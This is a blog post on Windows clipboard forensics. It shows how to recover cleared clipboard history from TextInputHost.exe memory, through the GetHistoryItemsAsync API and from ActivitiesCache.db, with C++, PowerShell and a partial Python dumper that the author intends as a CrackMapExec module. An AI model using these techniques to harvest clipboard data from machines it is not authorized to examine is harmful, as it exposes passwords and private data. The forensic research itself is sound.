<!DOCTYPE html><html lang="en-US"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"> <!-- Begin Jekyll SEO tag v2.8.0 --><title>The Art of Clipboard Forensics Recovering Deleted Data | RET2Pwn</title><meta name="generator" content="Jekyll v3.9.3" /><meta property="og:title" content="The Art of Clipboard Forensics Recovering Deleted Data" /><meta name="author" content="Hazem Hisham" /><meta property="og:locale" content="en_US" /><meta name="description" content="Introduction" /><meta property="og:description" content="Introduction" /><link rel="canonical" href="https://xret2pwn.github.io//The-Art-of-Clipboard-Forensics-Recovering-Deleted-Data/" /><meta property="og:url" content="https://xret2pwn.github.io//The-Art-of-Clipboard-Forensics-Recovering-Deleted-Data/" /><meta property="og:site_name" content="RET2Pwn" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-04-27T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="The Art of Clipboard Forensics Recovering Deleted Data" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Hazem Hisham"},"dateModified":"2023-04-27T00:00:00+00:00","datePublished":"2023-04-27T00:00:00+00:00","description":"Introduction","headline":"The Art of Clipboard Forensics Recovering Deleted Data","mainEntityOfPage":{"@type":"WebPage","@id":"https://xret2pwn.github.io//The-Art-of-Clipboard-Forensics-Recovering-Deleted-Data/"},"url":"https://xret2pwn.github.io//The-Art-of-Clipboard-Forensics-Recovering-Deleted-Data/"}</script> <!-- End Jekyll SEO tag --><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/icons/apple-touch-icon.png?v=qA3OXqyw77"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/icons/favicon-32x32.png?v=qA3OXqyw77"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/icons/favicon-16x16.png?v=qA3OXqyw77"><link rel="manifest" href="/assets/img/icons/manifest.json?v=qA3OXqyw77"><link rel="mask-icon" href="/assets/img/icons/safari-pinned-tab.svg?v=qA3OXqyw77" color="#5bbad5"> <!--[if IE]><link rel="shortcut icon" href="/assets/img/icons/favicon.ico?v=qA3OXqyw77"><![endif]--><link rel="shortcut icon" href="/assets/img/icons/favicon.ico?v=qA3OXqyw77"><meta name="apple-mobile-web-app-title" content="Sleek"><meta name="application-name" content="Sleek"><meta name="msapplication-config" content="/assets/img/icons/browserconfig.xml?v=qA3OXqyw77"><meta name="theme-color" content="#ffffff"><style class="inlineCSS"> h1{color:#313237;margin-top:0;margin-bottom:.5rem}.dark-bg{background-color:#313237}@media only screen and (min-width:48em){.post-card{width:48.4375%;margin-right:3.125%}.post-card:last-of-type,.post-card:nth-child(2n+2){margin-right:0}}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}figure,main{display:block}figure{margin:1em 40px}a{background-color:transparent;-webkit-text-decoration-skip:objects}img{border-style:none}svg:not(:root){overflow:hidden}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{-webkit-box-sizing:border-box;box-sizing:border-box}body{-webkit-overflow-scrolling:touch}*,::after,::before{-webkit-box-sizing:inherit;box-sizing:inherit}.site{display:-webkit-box;display:-ms-flexbox;display:flex;min-height:100vh;-webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column}.site__content{-webkit-box-flex:1;-ms-flex:1;flex:1}img{max-width:100%;height:auto;width:auto;vertical-align:middle}figure{margin:0}body{background-color:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Hiragino Sans GB","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;font-size:1rem;line-height:1.5;color:#343851;-webkit-font-smoothing:antialiased;-webkit-text-size-adjust:100%}p{margin-top:0;margin-bottom:1.25rem}h1,h2{color:#313237;margin-top:0;margin-bottom:.5rem}a{color:#277cea;text-decoration:none;border-bottom:1px dashed #277cea}.blur{background:#fff;filter:url('data:image/svg+xml;charset=utf-8,<svg xmlns="http://www.w3.org/2000/svg"><filter id="filter"><feGaussianBlur stdDeviation="16" /></filter></svg>#filter');-webkit-filter:blur(1rem);filter:blur(1rem)}.container{padding:0 20px;max-width:100%;margin:0 auto}@media only screen and (min-width:36em){.container{max-width:540px;margin:0 auto}}@media only screen and (min-width:48em){.container{max-width:720px;margin:0 auto}}@media only screen and (min-width:62em){.container{max-width:960px;margin:0 auto}}@media only screen and (min-width:75em){.container{max-width:1170px;margin:0 auto}}.header{background-color:#fff;color:#343851;position:absolute;z-index:4;width:100%;top:0;left:0;will-change:transform;-webkit-transform:translateY(0);transform:translateY(0)}.header a{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;border-bottom:0}.header__logo{display:-webkit-box;display:-ms-flexbox;display:flex;height:100%;overflow:hidden;padding:19px 0;margin-right:1.25rem;outline:0;border-bottom:0;color:#313237}.header__logo .header__logo--container{width:58px}.header__logo .header__logo--container .logo{fill:currentColor}.header__inner{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;height:3.75em;-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.header__links{padding-bottom:.5rem;display:none;position:absolute;top:3.75em;left:0;width:100%;height:auto;background:#fff}.header__link{color:#343851;padding:.938rem 0;border-top:1px solid #ededed}.header__toggle{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;width:44px;height:100%;background-color:transparent;padding-left:1.25rem}.header__toggle span{display:block;position:relative;margin-top:4px;background-color:#343851;width:100%;height:2px;border-radius:1px}.header__toggle span:first-child{margin-top:0}@media (min-width:62em){.header__toggle{display:none;visibility:hidden}.header__links{position:static;padding:0;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column;visibility:visible;width:auto;height:100%}.header__links-wrapper{display:-webkit-box;display:-ms-flexbox;display:flex;height:100%;padding:0}.header__link{position:relative;padding:.938rem 1rem;border:0;height:100%}.header__link::after{content:"";display:block;position:absolute;left:0;bottom:0;height:3px;width:100%;-webkit-transform:scaleX(0);transform:scaleX(0);background:#277cea}}.post-card{display:block;position:relative;width:100%;min-height:250px;border-radius:4px;overflow:hidden;background-color:#fff;-webkit-box-shadow:0 1px 3px rgba(0,0,0,.08);box-shadow:0 1px 3px rgba(0,0,0,.08);margin-bottom:2.25rem;border-bottom:0}@media only screen and (min-width:48em){.post-card{width:48.4375%;margin-right:3.125%}.post-card:nth-child(2n+2){margin-right:0}}@media only screen and (min-width:75em){.post-card{width:31.25%;margin-right:3.125%}.post-card:nth-child(2n+2){margin-right:3.125%}}.post-card__label{position:absolute;top:1.5rem;left:1.5rem;z-index:2}.post-card__inner{display:block;position:relative;padding:1.875rem 1.25rem .625rem;width:100%;color:#838c8d;border-bottom:0}.post-card__header{margin-bottom:.75rem}.post-card__meta{font-size:.875rem}.post-card__thumb{margin:0;background:#fff;position:relative;overflow:hidden}.post-card__thumb::after{content:"";display:block;height:0;width:100%;padding-bottom:56.25%}.post-card__thumb>*{position:absolute;top:0;left:0;width:100%;height:100%;display:block}.label{padding:0 10px;margin-bottom:1rem;display:inline-block;line-height:20px;font-size:.75rem;text-transform:uppercase;letter-spacing:1px;color:rgba(255,255,255,.8);border:2px solid rgba(255,255,255,.5);border-radius:100px}.hero{margin:3.75rem auto 0;min-height:16.25rem;width:100%;position:relative;background-color:#dde5ea;background-repeat:no-repeat;background-position:50%;background-size:cover}@media only screen and (min-width:62em){.hero{margin:0 auto;height:36em}}.hero::before{position:absolute;display:block;content:"";top:0;left:0;width:100%;height:100%;background:rgba(52,56,81,.8)}.hero__wrap{position:absolute;margin:auto;top:50%;left:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);text-align:center;color:rgba(255,255,255,.8);width:100%;max-width:90%;z-index:1}.hero__wrap .hero__title{font-size:1.8em;color:#fff}.blog{background-color:#f9f9f9}.post-list{padding-top:2.5em;display:-webkit-box;display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-box-flex:1;-ms-flex:1 0 auto;flex:1 0 auto}@media only screen and (min-width:48em){.hero__wrap{max-width:40em}.hero__wrap .hero__title{padding:1rem 0;font-size:2.625em;line-height:3.125rem}.post-list{padding-top:5em}}</style><link rel="preload" href="/assets/css/main.css" as="style" onload="this.rel='stylesheet'"> <noscript><link rel="stylesheet" href="/assets/css/main.css"></noscript> <script type="text/javascript"> /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */ (function(w){"use strict";if(!w.loadCSS){w.loadCSS=function(){}} var rp=loadCSS.relpreload={};rp.support=(function(){var ret;try{ret=w.document.createElement("link").relList.supports("preload")}catch(e){ret=!1} return function(){return ret}})();rp.bindMediaToggle=function(link){var finalMedia=link.media||"all";function enableStylesheet(){link.media=finalMedia} if(link.addEventListener){link.addEventListener("load",enableStylesheet)}else if(link.attachEvent){link.attachEvent("onload",enableStylesheet)} setTimeout(function(){link.rel="stylesheet";link.media="only x"});setTimeout(enableStylesheet,3000)};rp.poly=function(){if(rp.support()){return} var links=w.document.getElementsByTagName("link");for(var i=0;i<links.length;i++){var link=links[i];if(link.rel==="preload"&&link.getAttribute("as")==="style"&&!link.getAttribute("data-loadcss")){link.setAttribute("data-loadcss",!0);rp.bindMediaToggle(link)}}};if(!rp.support()){rp.poly();var run=w.setInterval(rp.poly,500);if(w.addEventListener){w.addEventListener("load",function(){rp.poly();w.clearInterval(run)})}else if(w.attachEvent){w.attachEvent("onload",function(){rp.poly();w.clearInterval(run)})}} if(typeof exports!=="undefined"){exports.loadCSS=loadCSS} else{w.loadCSS=loadCSS}}(typeof global!=="undefined"?global:this)) </script></head><body class="site"><header class="header" itemscope itemtype="http://schema.org/SiteNavigationElement" aria-label="Main navigation"><div class="container"><div class="header__inner"> <a class="header__logo" href="/"><h2>RET2Pwn</h2></a><nav class="header__links"><div class="container header__links-wrapper"> <a class="header__link" href="/" itemprop="url"> <span itemprop="name">Home</span> </a> <a class="header__link" href="/categories" itemprop="url"> <span itemprop="name">Categories</span> </a> <a class="header__link" href="/about" itemprop="url"> <span itemprop="name">About</span> </a></div></nav><div class="header__toggle"> <span></span> <span></span> <span></span></div></div></div></header><div class="hero lazyload" data-bg="https://xret2pwn.github.io//assets/img/posts/The-Art-of-Clipboard-Forensics-Recovering-Deleted-Data/background.jpg"><div class="hero__wrap"><div class="hero__categories"> <a class="label" href="/categories/#forensics">forensics</a></div><h1 class="hero__title">The Art of Clipboard Forensics Recovering Deleted Data</h1><p class="hero__meta"> <span> <time>27 Apr 2023</time>&nbsp;&middot; </span> <span> 16 mins read </span></p></div></div><main class="site__content"><div class="container"><article class="post-content" itemprop="articleBody"><h1 id="introduction">Introduction</h1><p>In this blog post, I’ll be sharing my notes from my exploration of clipboard forensics. I’ll cover the tools and techniques used in this process and explain how you can use them to dump the clipboard data even if it deleted. So, if you’re interested in learning more about clipboard forensics, read on!</p><h1 id="table-of-content">Table of Content</h1><ol><li><a href="#introduction">Introduction</a></li><li><a href="#goal-and-objective">Goal and Objective</a></li><li><a href="#enabling-the-clipboard">Enabling the Clipboard</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#recovering-deleted-clipboard-data">Recovering Deleted Clipboard Data</a></li><li><a href="#clipboard-history-apis">Clipboard History APIs</a></li><li><a href="#another-way">Another Way</a></li><li><a href="#crackmapexec-module">CrackMapExec Module</a></li><li><a href="#conclusion">Conclusion</a></li></ol><h1 id="goal-and-objective">Goal and Objective</h1><p>My goal was to challenge myself by exploring Windows APIs, and I chose to focus on the Clipboard. While I knew that Microsoft had thoroughly documented the Clipboard, I wanted to test my skills by delving deeper into its data APIs. During my exploration, I stumbled upon something that completely changed my objective: the possibility of recovering deleted Clipboard data. This discovery motivated me to push my skills further and find a way to dump even the deleted Clipboard data. I will share my findings and techniques in this blog post. I hope you enjoy reading!</p><h1 id="enabling-the-clipboard">Enabling the Clipboard</h1><p>Now that the goal is clear, the next step is to figure out where to start. I decided to begin with the Windows System Clipboard, as it is the place where you can enable or disable the clipboard history in Windows. To understand how this works, I wanted to know how Windows knows whether the clipboard is enabled or disabled, and whether there is a registry key that controls it.</p><p>To find out, I used a tool called <strong>Process Monitor</strong> to monitor registry activity on the system. After some digging, I was able to locate the registry key responsible for controlling the Clipboard feature: ClipboardEnabled. When this key is set to 1, the clipboard is enabled, and when it is set to 0, the clipboard is disabled.</p><p><img src="/assets/img/posts/The-Art-of-Clipboard-Forensics-Recovering-Deleted-Data/ProcessMonitor.png" alt="screenshot_1" /></p><p><img src="/assets/img/posts/The-Art-of-Clipboard-Forensics-Recovering-Deleted-Data/RegistryEditor.png" alt="screenshot_1" /></p><h1 id="enumeration">Enumeration</h1><p>So, now I know how to enable the clipboard, but I still don’t know which API that I can use it to get the clipboarded data. I came up with an idea: what if I searched for any DLLs in the System32 folder that were named Clipboard? To my surprise, I found two DLLs:</p><ol><li>ClipboardServer.dll</li><li>SettingsHandlers_Clipboard.dll</li></ol><p>So, I have tried to know the exported functions in those DLLs,</p><p>For ClipboardServer.dll I found 3 functions listed below:</p><table><thead><tr><th style="text-align: left">Function Name</th></tr></thead><tbody><tr><td style="text-align: left">DllCanUnloadNow</td></tr><tr><td style="text-align: left">DllGetActivationFactory</td></tr><tr><td style="text-align: left">DllGetClassObject</td></tr></tbody></table><p>For SettingsHandlers_Clipboard.dll I found 4 functions listed below:</p><table><thead><tr><th style="text-align: left">Function Name</th></tr></thead><tbody><tr><td style="text-align: left">DllCanUnloadNow</td></tr><tr><td style="text-align: left">DllGetActivationFactory</td></tr><tr><td style="text-align: left">DllGetClassObject</td></tr><tr><td style="text-align: left">GetSetting</td></tr></tbody></table><p>But I still feel like there are other DLLs I didn’t get, so I tried to get the loaded DLL in the current running processes I did that through the following command.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> tasklist /m
</code></pre></div></div><p>Then I found 2 other DLLs listed below:</p><ol><li>Clipc.dll</li><li>ClipSVC.dll</li></ol><p>So I have tried to do the same I did in the previous DLLs.</p><p>For ClipSVC.dll I found 2 functions listed below:</p><table><thead><tr><th style="text-align: left">Function Name</th></tr></thead><tbody><tr><td style="text-align: left">ServiceMain</td></tr><tr><td style="text-align: left">SvchostPushServiceGlobals</td></tr></tbody></table><p>For Clipc.dll, I found 22 functions, and the function names seemed to be related to clipboard APIs.</p><p>I also attempted to find the related process for the clipboard viewer by pressing <code class="language-plaintext highlighter-rouge">WIN+V</code>. However, the problem with the clipboard viewer is that once you click anywhere outside of the viewer, the window will close. This made it difficult to retrieve the process name for the clipboard viewer using traditional methods. Despite my efforts, I was unable to find the process name for the clipboard viewer.</p><h1 id="recovering-deleted-clipboard-data">Recovering Deleted Clipboard Data</h1><p>By reversing the previous DLLs, I discovered a file called <code class="language-plaintext highlighter-rouge">tokens.dat</code> in the <code class="language-plaintext highlighter-rouge">%ProgramData%\Microsoft\Windows\ClipSVC</code> folder. This file contains encrypted data related to the Clipboard.</p><p>It’s worth noting that the <code class="language-plaintext highlighter-rouge">ClipSVC</code> folder is used by the Clipboard Service in Windows, which is responsible for managing the Clipboard. The service runs as a Windows Service and is started automatically at system startup. The <code class="language-plaintext highlighter-rouge">ClipSVC</code> folder contains various files and subfolders that are used by the Clipboard Service to store Clipboard data, history, and other related information.</p><p>While I didn’t attempt to reverse the DLL to write a decryption function to read the Clipboard data for burnout purposes, I may do so later.</p><p>I then wondered if the data was already decrypted by the process, could I scrape the Clipboard data from memory? Upon investigating further, I discovered that the process that uses <code class="language-plaintext highlighter-rouge">CLIPC.dll</code> is called <code class="language-plaintext highlighter-rouge">TextinputHost.exe</code>. So, I used <strong>Process Hacker</strong> to search for the Clipboarded data.</p><p><img src="/assets/img/posts/The-Art-of-Clipboard-Forensics-Recovering-Deleted-Data/ProcHacker1.png" alt="screenshot_1" /></p><p>I then cleared the Clipboard data history and checked if it could still be scraped from memory.</p><p><img src="/assets/img/posts/The-Art-of-Clipboard-Forensics-Recovering-Deleted-Data/ProcHacker2.png" alt="screenshot_1" /></p><p>As expected it didn’t get deleted from memory.</p><h1 id="clipboard-history-apis">Clipboard History APIs</h1><p>After scraping the deleted/cleared clipboard data, I was wondering if it was just deleted from the Clipboard Viewer. So, I wanted to check if using the clipboard history APIs would return the deleted data or if it would say that it’s deleted.</p><p>So, I have found the <code class="language-plaintext highlighter-rouge">windows.applicationmodel.datatransfer.clipboard.gethistoryitemsasync</code> method. This method allows you to retrieve a list of <code class="language-plaintext highlighter-rouge">ClipboardHistoryItem</code> objects representing the contents of the user’s clipboard history. <a href="https://learn.microsoft.com/en-us/uwp/api/windows.applicationmodel.datatransfer.clipboard.gethistoryitemsasync?view=winrt-22621">Clipboard.GetHistoryItemsAsync Method (Windows.ApplicationModel.DataTransfer) - Windows UWP applications | Microsoft Learn</a></p><p>By using this method, we can get the clipboard history, but it doesn’t return the deleted clipboard history. Therefore, we can only get the deleted history by scraping the memory of the TextinputHost.exe process. However, once the machine is rebooted, the data will also be removed.”</p><div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;iostream&gt;
#include &lt;winrt/Windows.ApplicationModel.DataTransfer.h&gt;
#include &lt;winrt/Windows.Foundation.h&gt;
</span>
<span class="k">using</span> <span class="k">namespace</span> <span class="n">winrt</span><span class="p">;</span>
<span class="k">using</span> <span class="k">namespace</span> <span class="n">Windows</span><span class="o">::</span><span class="n">ApplicationModel</span><span class="o">::</span><span class="n">DataTransfer</span><span class="p">;</span>
<span class="k">using</span> <span class="k">namespace</span> <span class="n">Windows</span><span class="o">::</span><span class="n">Foundation</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">init_apartment</span><span class="p">();</span>

    <span class="n">IVectorView</span><span class="o">&lt;</span><span class="n">ClipboardHistoryItem</span><span class="o">&gt;</span> <span class="n">historyItems</span> <span class="o">=</span> <span class="n">Clipboard</span><span class="o">::</span><span class="n">GetHistoryItemsAsync</span><span class="p">().</span><span class="n">get</span><span class="p">();</span>

    <span class="k">for</span> <span class="p">(</span><span class="k">auto</span> <span class="k">const</span><span class="o">&amp;</span> <span class="n">item</span> <span class="o">:</span> <span class="n">historyItems</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"FormatId: "</span> <span class="o">&lt;&lt;</span> <span class="n">item</span><span class="p">.</span><span class="n">FormatId</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Content: "</span> <span class="o">&lt;&lt;</span> <span class="n">winrt</span><span class="o">::</span><span class="n">to_string</span><span class="p">(</span><span class="n">item</span><span class="p">.</span><span class="n">Content</span><span class="p">().</span><span class="n">ToString</span><span class="p">())</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div><p>While writing this blog post, I stumbled upon a new post by Raymond Chen, which explains how to enumerate the clipboard history using PowerShell. <a href="https://devblogs.microsoft.com/oldnewthing/20230303-00/?p=107894">Enumerating Windows clipboard history in PowerShell - The Old New Thing (microsoft.com)</a></p><div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
</span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-AssemblyName</span><span class="w"> </span><span class="nx">System.Runtime.WindowsRuntime</span><span class="w">
</span><span class="nv">$asTaskGeneric</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">System.WindowsRuntimeSystemExtensions</span><span class="p">]</span><span class="o">.</span><span class="nf">GetMethods</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s1">'AsTask'</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">GetParameters</span><span class="p">()</span><span class="o">.</span><span class="nf">Count</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">GetParameters</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nf">ParameterType</span><span class="o">.</span><span class="nf">Name</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s1">'IAsyncOperation`1'</span><span class="w"> </span><span class="p">})[</span><span class="mi">0</span><span class="p">]</span><span class="w">
</span><span class="kr">function</span><span class="w"> </span><span class="nf">Await</span><span class="p">(</span><span class="nv">$WinRtTask</span><span class="p">,</span><span class="w"> </span><span class="nv">$ResultType</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span><span class="nv">$asTask</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$asTaskGeneric</span><span class="o">.</span><span class="nf">MakeGenericMethod</span><span class="p">(</span><span class="nv">$ResultType</span><span class="p">)</span><span class="w">
 </span><span class="nv">$netTask</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$asTask</span><span class="o">.</span><span class="nf">Invoke</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="w"> </span><span class="p">@(</span><span class="nv">$WinRtTask</span><span class="p">))</span><span class="w">
 </span><span class="nv">$netTask</span><span class="o">.</span><span class="nf">Wait</span><span class="p">(</span><span class="nt">-1</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
 </span><span class="nv">$netTask</span><span class="o">.</span><span class="nf">Result</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="bp">$null</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Windows.ApplicationModel.DataTransfer.Clipboard</span><span class="p">,</span><span class="w"> </span><span class="n">Windows.ApplicationModel.DataTransfer</span><span class="p">,</span><span class="w"> </span><span class="n">ContentType</span><span class="o">=</span><span class="n">WindowsRuntime</span><span class="p">]</span><span class="w">
</span><span class="nv">$op</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Windows.ApplicationModel.DataTransfer.Clipboard</span><span class="p">]::</span><span class="n">GetHistoryItemsAsync</span><span class="p">()</span><span class="w">

</span><span class="nv">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Await</span><span class="w"> </span><span class="p">(</span><span class="nv">$op</span><span class="p">)</span><span class="w"> </span><span class="err">`</span><span class="w">
    </span><span class="p">([</span><span class="n">Windows.ApplicationModel.DataTransfer.ClipboardHistoryItemsResult</span><span class="p">])</span><span class="w">

</span><span class="nv">$textops</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$result</span><span class="o">.</span><span class="nf">Items</span><span class="o">.</span><span class="nf">Content</span><span class="o">.</span><span class="nf">GetTextAsync</span><span class="p">()</span><span class="w">
</span><span class="kr">for</span><span class="w"> </span><span class="p">(</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="nv">$i</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="nv">$textops</span><span class="o">.</span><span class="nf">Count</span><span class="p">;</span><span class="w"> </span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span><span class="w"> </span><span class="n">Await</span><span class="p">(</span><span class="nv">$textops</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span><span class="w"> </span><span class="p">([</span><span class="n">String</span><span class="p">])</span><span class="w"> </span><span class="p">}</span><span class="w">

</span></code></pre></div></div><p>He is using the same method. but I still didn’t get the clipboard data history.</p><h1 id="another-way">Another Way</h1><p><a href="https://twitter.com/inversecos">@inversecos</a> Introduced another way to get the clipboard history, by enumerating the ActivitiesCache.db <a href="https://www.inversecos.com/2022/05/how-to-perform-clipboard-forensics.html">How to Perform Clipboard Forensics: ActivitiesCache.db, Memory Forensics and Clipboard History (inversecos.com)</a></p><p>The ActivitiesCache.db can be located in <code class="language-plaintext highlighter-rouge">%AppData%\Local\ConnectedDevicesPlatform\&lt;UserProfile&gt;\</code>. I was interested in adding a new module to crackmapexec for dumping the clipboard history, so I wrote a quick Python script to dump the ActivitiesCache.db file.</p><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">psutil</span>
<span class="kn">import</span> <span class="nn">sqlite3</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">base64</span>


<span class="k">def</span> <span class="nf">get_user_profiles</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">dict</span><span class="p">:</span>
    <span class="s">"""
    Returns a dictionary containing user profiles of ConnectedDevicesPlatform folder
    """</span>
    <span class="n">users</span> <span class="o">=</span> <span class="p">[</span><span class="n">user</span><span class="p">.</span><span class="n">name</span> <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">psutil</span><span class="p">.</span><span class="n">users</span><span class="p">()]</span>
    <span class="n">profiles</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
        <span class="n">profile_folder_name</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">folder_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="s">'C:</span><span class="se">\\</span><span class="s">Users'</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="s">'AppData'</span><span class="p">,</span> <span class="s">'Local'</span><span class="p">,</span> <span class="s">'ConnectedDevicesPlatform'</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">folder_path</span><span class="p">):</span>
            <span class="n">items</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">folder_path</span><span class="p">)</span>
            <span class="n">num_dirs</span> <span class="o">=</span> <span class="mi">0</span>
            <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">items</span><span class="p">:</span>
                <span class="n">item_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">folder_path</span><span class="p">,</span> <span class="n">item</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">isdir</span><span class="p">(</span><span class="n">item_path</span><span class="p">):</span>
                    <span class="n">subfolder_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">item_path</span><span class="p">)</span>
                    <span class="n">subitems</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">subfolder_path</span><span class="p">)</span>

                    <span class="k">for</span> <span class="n">subitem</span> <span class="ow">in</span> <span class="n">subitems</span><span class="p">:</span>
                        <span class="k">if</span> <span class="n">subitem</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">".db"</span><span class="p">):</span>
                            <span class="n">profile_folder_name</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">item_path</span><span class="p">,</span> <span class="n">subitem</span><span class="p">))</span>
                            <span class="n">num_dirs</span> <span class="o">+=</span> <span class="mi">1</span>

            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">profile_folder_name</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">profiles</span><span class="p">[</span><span class="n">user</span><span class="p">]</span> <span class="o">=</span> <span class="n">profile_folder_name</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">: Found </span><span class="si">{</span><span class="n">num_dirs</span><span class="si">}</span><span class="s"> directories in ConnectedDevicesPlatform folder'</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">: ConnectedDevicesPlatform folder not found'</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">profiles</span>


<span class="k">def</span> <span class="nf">get_clipboard_data</span><span class="p">():</span>
    <span class="s">"""
    Extracts clipboard data from ConnectedDevicesPlatform folders
    """</span>
    <span class="n">profiles</span> <span class="o">=</span> <span class="n">get_user_profiles</span><span class="p">()</span>

